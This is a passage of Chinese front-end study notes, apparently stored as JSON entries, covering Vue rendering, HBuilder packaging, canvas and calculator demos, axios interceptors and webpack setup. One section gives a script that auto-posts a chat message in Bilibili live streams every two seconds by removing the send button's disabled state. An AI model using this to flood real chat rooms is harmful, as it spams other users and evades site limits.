2.0中，渲染层的实现做了根本性改动，那就是引入了虚拟DOM。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122041.png)\n\nVue的编译器在编译模板之后，会把这些模板编译成一个渲染函数。而函数被调用的时候就会渲染并且返回一个虚拟DOM的树。\n\n当我们有了这个虚拟的树之后，再交给一个Patch函数，负责把这些虚拟DOM真正施加到真实的DOM上。在这个过程中，Vue有自身的响应式系统来侦测在渲染过程中所依赖到的数据来源。在渲染过程中，侦测到数据来源之后就可以精确感知数据源的变动。到时候就可以根据需要重新进行渲染。当重新进行渲染之后，会生成一个新的树，将新的树与旧的树进行对比，就可以最终得出应施加到真实DOM上的改动。最后再通过Patch函数施加改动。\n\n简单点讲，在Vue的底层实现上，Vue将模板编译成虚拟DOM渲染函数。结合Vue自带的响应系统，在应该状态改变时，Vue能够智能地计算出重新渲染组件的最小代价并应到DOM操作上。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122051.png)\n\n\nVue支持我们通过data参数传递一个JavaScript对象做为组件数据，然后Vue将遍历此对象属性，使用Object.defineProperty方法设置描述对象，通过存取器函数可以追踪该属性的变更，Vue创建了一层Watcher层，在组件渲染的过程中把属性记录为依赖，之后当依赖项的setter被调用时，会通知Watcher重新计算，从而使它关联的组件得以更新,如下图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122101.png)\n\n对于Vue自带的响应式系统，并不是咱们今天要聊的东西。我们还是回到Vue的虚拟DOM中来。对于虚拟DOM，咱们来看一个简单的实例，就是下图所示的这个，详细的阐述了`模板 → 渲染函数 → 虚拟DOM树 → 真实DOM`的一个过程\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122110.png)\n\n其实Vue中的虚拟DOM还是很复杂的，我也是一知半解，如果你想深入的了解，可以阅读@JoeRay61的[《Vue原理解析之Virtual DOM》](https://segmentfault.com/a/1190000008291645)一文。\n\n通过前面的学习，我们初步了解到Vue通过建立一个虚拟DOM对真实DOM发生的变化保持追踪。比如下面这行代码：\n```js\nreturn createElement('h1', this.blogTitle)\n```\n\ncreateElement 到底会返回什么呢？其实不是一个实际的 DOM 元素。它更准确的名字可能是 createNodeDescription，因为它所包含的信息会告诉 Vue 页面上需要渲染什么样的节点，及其子节点。我们把这样的节点描述为**虚拟节点 (Virtual Node)**，也常简写它为**VNode**。“虚拟 DOM”是我们对由 Vue 组件树建立起来的整个 VNode 树的称呼。\n\nVue组件树建立起来的整个VNode树是唯一的。这意味着，下面的render函数是无效的：\n```js\nrender: function (createElement) {\n    var myParagraphVNode = createElement('p', 'hi')\n    return createElement('div', [\n        // 错误-重复的 VNodes\n        myParagraphVNode, myParagraphVNode\n    ])\n}\n```\n如果你真的需要重复很多次的元素/组件，你可以使用工厂函数来实现。例如，下面这个例子 render 函数完美有效地渲染了 20 个重复的段落：\n```js\nrender: function (createElement) {\n    return createElement('div',\n        Array.apply(null, { length: 20 }).map(function () {\n            return createElement('p', 'hi')\n        })\n    )\n}\n```\n\n## Vue的渲染机制\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122123.png)\n\n上图展示的是独立构建时的一个渲染流程图。\n\n继续使用上面用到的模板到真实DOM过程的一个图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122133.png)\n\n这里会涉及到Vue的另外两个概念：\n- 独立构建：包含模板编译器，渲染过程HTML字符串 → render函数 → VNode → 真实DOM节点\n- 运行时构建：不包含模板编译器，渲染过程render函数 → VNode → 真实DOM节点\n\n运行时构建的包，会比独立构建少一个模板编译器。在`$mount`函数上也不同。而`$mount`方法又是整个渲染过程的起始点。用一张流程图来说明：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122147.png)\n\n由此图可以看到，在渲染过程中，提供了三种渲染模式，自定义render函数、template、el均可以渲染页面，也就是对应我们使用Vue时，三种写法：\n**1. 自定义render函数**\n```js\nVue.component('anchored-heading', {\n    render: function (createElement) {\n        return createElement (\n            'h' + this.level,   // tag name标签名称\n            this.$slots.default // 子组件中的阵列\n        )\n    },\n    props: {\n        level: {\n            type: Number,\n            required: true\n        }\n    }\n})\n```\n**2. template写法**\n```js\nlet app = new Vue({\n    template: `<div>{{ msg }}</div>`,\n    data () {\n        return {\n            msg: ''\n        }\n    }\n})\n```\n**3. el写法**\n```js\nlet app = new Vue({\n    el: '#app',\n    data () {\n        return {\n            msg: 'Hello Vue!'\n        }\n    }\n})\n```\n这三种渲染模式最终都是要得到render函数。只不过用户自定义的render函数省去了程序分析的过程，等同于处理过的render函数，而普通的template或者el只是字符串，需要解析成AST，再将AST转化为render函数。\n\n**记住一点，无论哪种方法，都要得到render函数。**\n\n我们在使用过程中具体要使用哪种调用方式，要根据具体的需求来。\n\n如果是比较简单的逻辑，使用template和el比较好，因为这两种都属于声明式渲染，对用户理解比较容易，但灵活性比较差，因为最终生成的render函数是由程序通过AST解析优化得到的;而使用自定义render函数相当于人已经将逻辑翻译给程序，能够胜任复杂的逻辑，灵活性高，但对于用户的理解相对差点。\n\n## 总结\n回过头来看，Vue中的渲染核心关键的几步流程还是非常清晰的：\n\n- new Vue，执行初始化\n- 挂载$mount方法，通过自定义render方法、template、el等生成render函数\n- 通过Watcher监听数据的变化\n- 当数据发生变化时，render函数执行生成VNode对象\n- 通过patch方法，对比新旧VNode对象，通过DOM Diff算法，添加、修改、删除真正的DOM元素\n- 至此，整个new Vue的渲染过程完毕。\n\n# 利用HBuilder打包Vue开发的webapp为app\n1. 首先使用`webpack`命令vue项目进行打包，放在dist目录中【注： 不要使用`webpack-dev-server`命令， 因为这个命令不会再本地生成打包文件，而是生成在内存中】\n2. 在HBuilder中创建一个`5+APP`项目\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122157.png)\n\n3. 创建好了空白的移动App模板之后，我们可以看到我们的文件夹路径变为这样（可以删除css、js、img等文件夹）\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122208.png)\n\n4. 将webpack打包好的dist目录下的东西移动该空包APP模板下，然后将打包好的index.html替换到空包APP中的index中去\n注意看下index.html中引用其他包的路径是否正确\n5. 将其进行云打包\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122222.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122234.png)\n\n"
  },
  {
    "title": "./notes/front-end/模板.md",
    "body": "# js绘制地图\n通过Tiled来画出如下形状的图形：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200120223714.png\"/>\n\n然后得到其data、width、height\n\nhtml代码：\n```html\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>canvas绘制地图</title>\n</head>\n<body>\n    <canvas id=\"canvas1\" width=\"480\" height=\"240\"></canvas>   <!--注意canvas的大小，要联系地图大小设置-->\n    <script>\n\n　　　　　//瓦片地图编辑器获取到的数据\n        var map={\n         \"data\":[0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0],\n        \"height\":6,\n         \"width\":12\n        }\n        var canvas = document.getElementById(\"canvas1\");\n        var ctx = canvas.getContext(\"2d\");\n\n        var W = 40;    //每一块地图块的宽\n        var H = 40;    //每一块地图块的高\n        var l = 0;\n        var t = 0;\n        for (var i=0; i<map.data.length; i++){    \n\n            l = i%map.width*W;     //绘画每一块地图块的X坐标\n            if (i%map.width==0&&i!=0){     //当达到一行是换行，注意第一行是0%0=0；所以应去除第一行换行的情况\n                t+=H;              //绘画地图块的Y坐标\n            }\n            if (map.data[i]>0){     //当地图块的数据不为0时绘画地图块\n                ctx.fillRect(l, t, W, H);\n            }    \n        }\n    </script>\n</body>\n</html>\n```\n效果：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200120223831.png\"/>\n\n# 实现计算器\n代码如下：\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>\n    <meta name=\"viewport\" content=\"width=device-width,initial-scale:1.0\">\n    <style>\n        html,body{\n            height: 95%;\n        }\n        div{\n            box-sizing: border-box;\n            font: 27px/30px '微软雅黑','sans-serif';\n        }\n        #main{\n            height: 93%;\n        }\n        #run{\n            height: 35%;\n            word-break: break-all;\n            white-space: normal;\n        }\n        #result{\n          height: 8%;\n          border: 1px solid black;\n          margin-bottom: 5px;\n        }\n        .error{\n          color: red!important;\n        }\n        .c3{\n            float: left;\n            width: 25%;\n            height: 13%;\n            border: 1px solid gray;\n            line-height: 70px;\n            text-align: center;\n            height: 70px;\n        }\n        .c6{\n            width: 50%;\n            height: 13%;\n            float: left;\n            border: 1px solid gray;\n            line-height: 70px;\n            text-align: center;\n            height: 70px;\n        }\n    </style>\n</head>\n<body>\n    <div id=\"main\">\n        <div id=\"run\"></div>\n        <div id=\"result\"></div>\n        <div id=\"computer\">\n          <div class=\"c3\">清空</div>\n          <div class=\"c6\">删除</div>\n          <div class=\"c3\">/</div>\n          <div class=\"c3\">7</div>\n          <div class=\"c3\">8</div>\n          <div class=\"c3\">9</div>\n          <div class=\"c3\">-</div>\n          <div class=\"c3\">4</div>\n          <div class=\"c3\">5</div>\n          <div class=\"c3\">6</div>\n          <div class=\"c3\">+</div>\n          <div class=\"c3\">1</div>\n          <div class=\"c3\">2</div>\n          <div class=\"c3\">3</div>\n          <div class=\"c3\">*</div>\n          <div class=\"c3\">0</div>\n          <div class=\"c3\">.</div>\n          <div class=\"c6\">=</div>\n        </div>\n    </div>\n</body>\n<script>\n    var main = document.getElementById('main');\n    var run = document.getElementById('run');\n    var result = document.getElementById('result');\n\n    main.onclick = function (ev) {\n        var el = ev.target;\n\n        //如果点击的不是类名以 c3 c6 开头的直接return\n        if(el.className.indexOf('c')!=0){\n            return;\n        }\n        if(el.innerHTML=='清空'){\n            run.innerHTML='';//清除全部\n            result.innerHTML='';//清除全部\n        }else if(el.innerHTML=='删除'){\n            run.innerHTML=run.innerHTML.substr(0,run.innerHTML.length-1);\n            judge(true)\n        }else if(el.innerHTML=='='){            \n          var res = judge(false)\n          if(res == 1){\n            result.innerHTML=eval(run.innerHTML);\n          }\n        }else{\n            run.innerHTML += el.innerHTML;\n            str = run.innerHTML;\n            result.innerHTML='';\n            judge(true);\n        }\n    }\n    \n  function judge(blag){\n    var judgeRes;\n    var str = run.innerHTML;\n    var reg = /[^0-9]{2}|[^0-9][0]/g\n    if(blag){\n      judgeRes = str.match(reg) == null ? true : false\n    }else{\n      var lastChar = str.substr(str.length-1,1);\n      judgeRes = isNaN(lastChar) ? false : true\n      if(str.match(reg) != null){\n        judgeRes = false\n      }\n    }\n    if(judgeRes){\n      result.classList.remove(\"error\")\n      run.classList.remove(\"error\")\n      result.innerHTML='';\n      return 1;\n    }else{\n      result.innerHTML=\"有错误\";\n      run.classList.add(\"error\")\n      result.classList.add(\"error\")\n      return 0;\n    }\n  }\n</script>\n</html>\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200120100147.png\"/>\n\n# js来实现自动发送弹幕\n下面是以b站直播弹幕为例的\n```js\nvar input = $('textarea.chat-input.border-box')[0]\nvar submit = $('button.bl-button.live-skin-highlight-button-bg.bl-button--primary.bl-button--small')[0]\n\n/**模拟input事件**/\nvar event =  document.createEvent(\"HTMLEvents\")\nevent.initEvent(\"input\", true, false);\n\nsetTimeout(function(){\n\tsubmit.removeAttribute(\"disabled\") // 如果不去掉disabled属性的话， sbumit是点击是不能发送弹幕的\n    input.value = \"niubi\"\n\tinput.dispatchEvent(event) // 让input输入框触发input事件， 这样的话点击发布按钮才会生效\n\tsubmit.click()\n\tsetTimeout(arguments.callee, 2000)\n}, 2000)\n```\n\n一般进行这种情况， 都要进行事件模拟， 所以你在写代码之前一定搞情况，  有哪些事件需要模拟\n\n\n# 表格排序模板\n```js\n/**\n * 对表格进行排序\n * @param $tbody 要排序的表格中的tbody部分\n * @param sortColName 要排序的字段名字\n * @param sortType 要排序的类型\n * @param method 要排序的方式\n */\nlet fieldSort = function ($tbody, sortColName, sortType, method) {\n    //保存表格中的中的所有行\n    let tempArr = [];\n    let tbodyTrs = $tbody.children();\n    let tbodyTrsLength = tbodyTrs.length;\n    for (let i = 0; i < tbodyTrsLength; i++) {\n        tempArr.push($(tbodyTrs[i]).remove());\n    }\n    tempArr.sort(fieldSortComparator(sortColName, sortType));\n    if (method === \"up\") {\n        for (let i = 0; i < tbodyTrsLength; i++) {\n            $tbody.append(tempArr[i]);\n        }\n    } else {\n        for (let i = tbodyTrsLength - 1; i >= 0; i--) {\n            $tbody.append(tempArr[i]);\n        }\n    }\n};\n\n/**\n * 将表单中的String-number类型的数据转换成number类型\n * @param obj tr\n * @param sortColName 要转换数据的列名\n * @returns {number} 转换后的数据\n */\nlet stringGradeToNumber = function (obj, sortColName) {\n    let grade = [\"不及格\", \"良\", \"优\"];\n    let index = grade.indexOf($(obj).children(\"[data-field=\" + sortColName + \"]\").text());\n    if (index !== -1) {\n        return index - 3;\n    } else {\n        return parseFloat($(obj).children(\"[data-field=\" + sortColName + \"]\").text());\n    }\n};\n/**\n * 表单排序比较器\n * @param sortColName 进行排序的列名\n * @param sortType 进行排序的类型\n * @returns {Function}\n */\nlet fieldSortComparator = function (sortColName, sortType) {\n    return function (a, b) {\n        if (sortType === \"number\") {\n            return parseFloat($(a).children(\"[data-field=\" + sortColName + \"]\").text()) - parseFloat($(b).children(\"[data-field=\" + sortColName + \"]\").text());\n        } else if (sortType === \"string\") {\n            return ($(a).children(\"[data-field=\" + sortColName + \"]\").text()).localeCompare(($(b).children(\"[data-field=\" + sortColName + \"]\").text()));\n        } else if (sortType === \"string-number\") {\n            return stringGradeToNumber(a, sortColName) - stringGradeToNumber(b, sortColName);\n        }\n    }\n};\n\n\n/**\n * 表格排序事件\n */\nlet tableSort = function () {\n    $(this).siblings().removeClass(\"up-sort\").removeClass(\"down-sort\");\n    //获取字段名\n    let colName = $(this).data(\"field\");\n    //获取字段的类型\n    let type = $(this).data(\"type\");\n    if ($(this).hasClass(\"up-sort\")) {\n        //降序排序\n        $(this).removeClass(\"up-sort\");\n        $(this).addClass(\"down-sort\");\n        fieldSort($(this).parent().parent().siblings(\"tbody\"), colName, type, \"down\");\n    } else {\n        //升序排序\n        $(this).removeClass(\"down-sort\");\n        $(this).addClass(\"up-sort\");\n        fieldSort($(this).parent().parent().siblings(\"tbody\"), colName, type, \"up\");\n    }\n};\n/**\n * 给表格绑定点击事件（排序图标显示）\n */\n$content.on(\"click\", \"table thead tr th\", tableSort);\n```\n\n# js实现已摇杆的方法移动物体\ndirection是摇杆\nball是要控制移动的物体小球\n```js\nvar _x_start,_y_start,_x_move,_y_move,_x_end,_y_end,left_start,top_start;\n//按下\ndocument.getelementbyid(\"direction\").addeventlistener(\"touchstart\",function(e)\n{\n    e.preventdefault();//取消默认事件\n    _x_start=e.touches[0].pagex; //起始按下位置x\n    _y_start=e.touches[0].pagey; //起始按下位置y\n    left_start=ball.offsetleft //元素左边距\n    top_start=ball.offsettop //元素右边距\n})\n//移动\ndocument.getelementbyid(\"direction\").addeventlistener(\"touchmove\",function(e)\n{\n    e.preventdefault();//取消默认事件\n    _x_move=e.touches[0].pagex;\n    _y_move=e.touches[0].pagey;\n    //左边距=当前触摸点-起始触摸位置+起始左边距\n    ball.style.left = parsefloat(_x_move)-parsefloat(_x_start)+parsefloat(left_start)+\"px\"\n     //上边距=当前触摸点-起始触摸位置+起始上边距\n    ball.style.top = parsefloat(_y_move)-parsefloat(_y_start)+parsefloat(top_start)+\"px\"\n})\n//松开\ndocument.getelementbyid(\"direction\").addeventlistener(\"touchend\",function(e)\n{\n    e.preventdefault();//取消默认事件\n    var _x_end=e.changedtouches[0].pagex; //松开位置\n    var _y_end=e.changedtouches[0].pagey; //松开位置\n})\n```\n<img width=\"300px\" src=\"https://gitee.com/naiswang/images/raw/master/20200120224918.png\"/>"
  },
  {
    "title": "./notes/front-end/axios.md",
    "body": "# Axios简介\nAxios是前端通信框架，用来实现异步通信。 因为vue的边界很明确，就是为了处理DOM，所以并不具备通信能力，为了解决通信问题，vue作者又开发了一个名为vue-resource的插件，不过在进入2.0版本后停止了对该插件的维护并推荐了Axios框架，当然也可以直接选择使用JQuery提供的AJAX通信功能.\n其功能特点如下：\n- 从浏览器中创建XMLHttpRequests\n- 从node.js创建http请求\n- 支持Promise API\n- 拦截请求和响应\n- 转换请求数据和响应树\n- 取消请求\n- 自动转换JSON数据\n- 客户端支持防御XSRF(跨站请求伪造)\n\n# 为什么要使用Axios\n由于Vue.js是一个视图层框架并且作者（尤雨溪）严格遵守 soc（关注度分离原则），所以Vue.js并不包含AJAX的通信功能，为了解决通信问题，作者单独开发了一个名为vue-resource的插件，不过在进入2.0版本以后停止了对该插件的维护并推荐了Axios框架\n\n# 实战\n咱们开发的接口大部分都是采用JSON格式，可以先在项目里模拟一段JSON数据，数据内容如下：\n```json\n{\n  \"name\": \"百度\",\n  \"url\": \"http://www.baidu.com\",\n}\n```\n创建一个名为data.json的文件并填入上面的内容，放在项目的根目录下，\n\n创建html：\n```html\n<div id=\"example\">\n  <div>\n    名称:{{info.name}}\n  </div>\n  <div>\n    链接:<a v-bind:href=\"info.url\" target=\"_blank\">{{info.url}}</a>\n  </div>\n</div>\n```\n\njs文件\n```js\n<script src=\"https://cdn.jsdelivr.net/npm/vue/dist/vue.js\"></script>\n<script src=\"https://unpkg.com/axios/dist/axios.min.js\"></script>\n\n<script type=\"text/javascript\">\n  var example = new Vue({\n    el:\"#example\",\n    data(){\n      return{\n        info:{\n          name:'',\n          url:''\n        }\n      }\n    },\n    mounted(){\n      axios\n        .get('data.json')\n        .then(response => this.info=response.data);\n    }\n  })\n</script>\n```\n\n# URL查询参数(query string)处理\n我们在调用 axios 的 get 请求的时候，很多时候会用params附上请求参数，注使用params时，不会覆盖掉url中已经携带了的请求参数：例如如下的代码\n```js\naxios({\n  method: 'get',\n  url: '/base/get?c=3&d=4',\n  params: {\n    a: 1,\n    b: 2\n  }\n})\n```\n最终，我们需要将上面的请求变成`/base/get?c=3&d=4&a=1&b=2`的形式发送给服务端，服务端才能正确解析 url 中的请求参数，所以，我们需要把 params 对象中的 key 和 value 正确的拼接到 url 上。\n\n上面的例子比较简单，我们看几个复杂的例子\n## 参数值为数组\n```js\naxios({\n  method: 'get',\n  url: '/base/get',\n  params: {\n    foo: ['bar', 'baz']\n  }\n})\n```\n最终请求的 url 是`/base/get?foo[]=bar&foo[]=baz'`。\n\n**axios get请求传递数组参数出现 [ ] 解决方法**\n解决方法：运用qs处理 (以下范例)\n```js\nimport qs from \"qs\"\n\naxios.get(url, {\n    method: 'get',\n    url: '/base/get',\n    params: {\n      foo: ['bar', 'baz']\n    }\n    paramsSerializer: function(params) {\n        return qs.stringify(params, {arrayFormat: 'repeat'})\n    }\n})\n```\n此时请求的url是`/base/get?foo=bar&foo=baz`\n\n若arrayFormat: 'comma', 则此时的请求的url是`/base/get?foo[0]=bar&foo[1]=baz`\n\n\n## 参数值为对象\n```js\naxios({\n  method: 'get',\n  url: '/base/get',\n  params: {\n    foo: {\n      bar: 'baz'\n    }\n  }\n})\n```\n最终请求的 url 是`/base/get?foo=%7B%22bar%22:%22baz%22%7D`，foo 后面拼接的是 {\"bar\":\"baz\"} encode 后的结果。\n\n参数值为 Date 类型\n```js\nconst date = new Date()\n\naxios({\n  method: 'get',\n  url: '/base/get',\n  params: {\n    date\n  }\n})\n```\n最终请求的 url 是 /base/get?date=2019-04-01T05:55:39.030Z，date 后面拼接的是 date.toISOString() 的结果。\n\n## 特殊字符支持\n对于字符 @、:、$、,、、`[`、`]`，我们是允许出现在 url 中的，不希望被 encode。\n```js\naxios({\n  method: 'get',\n  url: '/base/get',\n  params: {\n    foo: '@:$, '\n  }\n})\n```\n最终请求的 url 是 /base/get?foo=@:$+，注意，我们会把空格 转换成 +。\n\n## 空值忽略\n对于值为 null 或者 undefined 的属性，我们是不会添加到 url 参数中的。\n```js\naxios({\n  method: 'get',\n  url: '/base/get',\n  params: {\n    foo: 'bar',\n    baz: null\n  }\n})\n```\n最终请求的 url 是`/base/get?foo=bar`。\n\n## 丢弃 url 中的哈希标记\n```\naxios({\n  method: 'get',\n  url: '/base/get#hash',\n  params: {\n    foo: 'bar'\n  }\n})\n```\n最终请求的 url 是`/base/get?foo=bar`\n\n\n## 保留 url 中已存在的参数\n```js\naxios({\n  method: 'get',\n  url: '/base/get?foo=bar',\n  params: {\n    bar: 'baz'\n  }\n})\n```\n最终请求的 url 是 /base/get?foo=bar&bar=baz\n\n# Axios发送请求时params和data的区别\n- `params`是添加到url的请求字符串中的\n- `data`是添加到请求体（body）中的\n\n# axios拦截器接口配置与使用\n页面发送http请求，很多情况我们要对请求和其响应进行特定的处理；例如每个请求都附带后端返回的token，拿到response之前loading动画的展示等。如果请求数非常多，这样处理起来会非常的麻烦，程序的优雅性也会大打折扣。在这种情况下，axios为开发者提供了这样一个API：拦截器。拦截器分为 请求（request）拦截器和 响应（response）拦截器。\n- 请求拦截器：请求拦截器的作用是在请求发送前进行一些操作，例如在每个请求体里加上token，统一做了处理如果以后要改也非常容易。\n- 响应拦截器：响应拦截器的作用是在接收到响应后进行一些操作，例如在服务器返回登录状态失效，需要重新登录的时候，跳转到登录页等。\n\n## axios配置拦截器\n**axios的基础配置**\n\n项目目录如下图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131459.png)\n\n其中，api一般存放的为页面的请求，这些请求都需要统一经过请求拦截器的处理，这部分不是重点，随便拿出一个文件来进行展示，一看就能懂\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131510.png)\n\n重点在于request文件的编写，一下request.js文件代码， 分为3部分：axios基础配置、请求拦截器配置、响应拦截器配置\n```js\n// ====\n// ==== axios基础配置\n// ====\n//   在http.js中引入axios\nimport axios from 'axios'   //引入 axios\nimport QS from 'qs'; // 引入qs模块，用来序列化post类型的数据，某些请求会用得到\nimport { Message } from 'element-ui'    //引入 element-ui 的 Message 模块，用于信息提示\nimport store from '@/store'     //引入 vuex 中的数据\nimport { getToken } from '@/utils/auth'   //引入拿到的权限tocken\n\n// create an axios instance   创建axios实例\nconst service = axios.create({\n  baseURL: process.env.BASE_API, // api 的 base_url\n  timeout: 5000, // request timeout  设置请求超时时间\n  responseType: \"json\",\n  withCredentials: true, // 是否允许带cookie这些\n  headers: {\n    \"Content-Type\": \"application/json;charset=utf-8\"\n  }\n})\n\n\n// ====\n// ==== axios请求拦截器配置\n// ====\nservice.interceptors.request.use(\n  config => {\n    // 在发送请求之前做什么\n    if (config.method === \"post\") {\n      // 序列化\n      // config.data = qs.stringify(config.data);\n      // config.data = JSON.stringify(config.data);\n      // 温馨提示,若是贵公司的提交能直接接受json 格式,可以不用 qs 来序列化的\n    }else {\n          if (store.getters.token) {\n               // 若是有做鉴权token , 就给头部带上token\n               // 让每个请求携带token-- ['X-Token']为自定义key 请根据实际情况自行修改\n               // 若是需要跨站点,存放到 cookie 会好一点,限制也没那么多,有些浏览环境限制了 localstorage (隐身模式)的使用\n                config.headers['X-Token'] = getToken()\n          }\n    }\n    return config;\n  },\n  error => {\n    // 对请求错误做些什么，自己定义\n    Message({                  //使用element-ui的message进行信息提示\n      showClose: true,\n      message: error,\n      type: \"warning\"\n    });\n    return Promise.reject(error);\n  }\n)\n\n// ====\n// ==== axios响应拦截器配置\n// ====\nservice.interceptors.response.use(\n    response => {\n        // 如果返回的状态码为200，说明接口请求成功，可以正常拿到数据\n        // 否则的话抛出错误\n        if (response.status === 200) {\n            return Promise.resolve(response);\n        } else {\n            return Promise.reject(response);\n        }\n    },\n    // 服务器状态码不是2开头的的情况\n    // 这里可以跟你们的后台开发人员协商好统一的错误状态码\n    // 然后根据返回的状态码进行一些操作，例如登录过期提示，错误提示等等\n    // 下面列举几个常见的操作，其他需求可自行扩展\n    error => {\n        if (error.response.status) {\n            switch (error.response.status) {\n                // 401: 未登录\n                // 未登录则跳转登录页面，并携带当前页面的路径\n                // 在登录成功后返回当前页面，这一步需要在登录页操作。\n                case 401:\n                    router.replace({\n                        path: '/login',\n                        query: {\n                            redirect: router.currentRoute.fullPath\n                        }\n                    });\n                    break;\n\n                // 403 token过期\n                // 登录过期对用户进行提示\n                // 清除本地token和清空vuex中token对象\n                // 跳转登录页面\n                case 403:\n                      Message({\n                        message: '登录过期，请重新登录',\n                        duration: 1000,\n                        forbidClick: true\n                    });\n                    // 清除token\n                    localStorage.removeItem('token');\n                    store.commit('loginSuccess', null);\n                    // 跳转登录页面，并将要浏览的页面fullPath传过去，登录成功后跳转需要访问的页面\n                    setTimeout(() => {\n                        router.replace({\n                            path: '/login',\n                            query: {\n                                redirect: router.currentRoute.fullPath\n                            }\n                        });\n                    }, 1000);\n                    break;\n\n                // 404请求不存在\n                case 404:\n                    Message({\n                        message: '网络请求不存在',\n                        duration: 1500,\n                        forbidClick: true\n                    });\n                    break;\n                // 其他错误，直接抛出错误提示\n                default:\n                    Message({\n                        message: error.response.data,message,\n                        duration: 1500,\n                        forbidClick: true\n                    });\n            }\n            return Promise.reject(error.response);\n        }\n    }\n});\n\n\n// ====\n// ==== 暴露axios实例\n// ====\nexport default service;\n```\n\n## 在项目中调用拦截器\naxios封装好之后，调用就很简单了。我们把接口统一写在api文件夹中。（如果你的业务非常复杂，建议把不同模块或组件的请求分开写到不同的文件里，这样方便维护）。\n```js\n//   api.js\nimport request from '@/utils/request'\n\nexport function userSearch(name) {\n  return request({\n    url: '/search/user',\n    method: 'get',\n    params: { name }\n  })\n}\n```\n然后在具体的组件中进行调用即可\n```js\nimport { userSearch} from '@/api/api'\nexport default {\n  data() {\n    return {\n        name: '大大大大大西瓜G'\n    }\n  },\n  methods:{\n      getUserInfo () {\n          userSearch(this.name).then(res => {\n              //对拿到的res.data进行一番操作或者渲染\n          })\n      }\n  },\n  mounted() {\n      this.getUserInfo ();\n  }\n}\n```\n"
  },
  {
    "title": "./notes/front-end/webpack.md",
    "body": "# webpack简介\nwebpack 是前端的一个项目构建工具，它是基于 Node.js 开发出来的一个前端工具；\n借助于webpack这个前端自动化构建工具，可以完美实现资源的合并、打包、压缩、混淆等诸多功能。\n根据官网的图片介绍webpack打包的过程\n- [webpack官网](http://webpack.github.io/)\n\n# webpack安装的两种方式\n1. 运行`npm i webpack -g`全局安装webpack，这样就能在全局使用webpack的命令\n2. 在项目根目录中运行`npm i webpack --save-dev`安装到项目依赖中\n\n# 初步使用webpack打包构建列表隔行变色案例\n1. 运行`npm init`初始化项目，使用npm管理项目中的依赖包\n2. 创建项目基本的目录结构\n3. 使用`cnpm i jquery --save`安装jquery类库\n4. 创建`main.js`并书写各行变色的代码逻辑：\n\n```js\n// 导入jquery类库\nimport $ from 'jquery'\n\n// 设置偶数行背景色，索引从0开始，0是偶数\n$('#list li:even').css('backgroundColor','lightblue');\n// 设置奇数行背景色\n$('#list li:odd').css('backgroundColor','pink');\n```\n\n5. 直接在页面上引用`main.js`会报错，因为浏览器不认识`import`这种高级的JS语法，需要使用webpack进行处理，webpack默认会把这种高级的语法转换为低级的浏览器能识别的语法；\n6. 运行`webpack 入口文件路径 输出文件路径`对`main.js`进行处理：\n```shell\nwebpack src/js/main.js dist/bundle.js\n```\n\n# 使用webpack的配置文件简化打包时候的命令\n1. 在项目根目录中创建`webpack.config.js`\n2. 由于运行webpack命令的时候，webpack需要指定入口文件和输出文件的路径，所以，我们需要在`webpack.config.js`中配置这两个路径：\n```js\n// 导入处理路径的模块\nvar path = require('path');\n\n// 导出一个配置对象，将来webpack在启动的时候，会默认来查找webpack.config.js，并读取这个文件中导出的配置对象，来进行打包处理\nmodule.exports = {\n    entry: path.resolve(__dirname, 'src/js/main.js'), // 项目入口文件\n    output: { // 配置输出选项\n        path: path.resolve(__dirname, 'dist'), // 配置输出的路径\n        filename: 'bundle.js' // 配置输出的文件名\n    }\n}\n```\n然后我们直接输入`webpack`命令，webpack会做一下几步\n- 首先webpack发现，我们并没有通过命令的形式，给它指定入口和出口\n- webpack就会去项目的根目录中，查找一个叫做`webpack.config.js`的配置文件\n- 当找到配置文件后，webpack会去解析这个配置文件，当解析执行配置文件完成后，就会得到配置文件中的配置对象\n- 当webpack拿到配置对象后，就拿到了配置对象中的指定的入口和出口，然后进行打包构建\n\n\n# 实现webpack的实时打包构建\n由于每次重新修改代码之后，都需要手动运行webpack打包的命令，比较麻烦，所以使用`webpack-dev-server`工具来实现代码实时打包编译，当修改代码之后，会自动进行打包构建。\n- 运行`cnpm i webpack-dev-server --save-dev`安装到开发依赖\n- 安装完成之后，在命令行直接运行`webpack-dev-server`来进行打包，发现报错，此时需要借助于`package.json`文件中的指令来进行运行`webpack-dev-server`命令，在`package.json`文件中的`scripts`节点下新增`\"dev\": \"webpack-dev-server\"`指令，然后在命令行直接运行`npm run dev`,发现可以进行实时打包，但是dist目录下并没有生成`bundle.js`文件，这是因为`webpack-dev-server`将打包好的文件放在了内存中\n- 把`bundle.js`放在内存中的好处是：由于需要实时打包编译，所以放在内存中速度会非常快\n- 这个时候访问webpack-dev-server启动的`http://localhost:8080/`网站，发现是一个文件夹的面板，需要点击到src目录下，才能打开我们的index首页，此时引用不到bundle.js文件，需要修改index.html中script的src属性为:`<script src=\"../bundle.js\"></script>`\n- 为了能在访问`http://localhost:8080/`的时候直接访问到index首页，可以使用`--contentBase src`指令来修改dev指令，指定启动的根目录：\n```\n 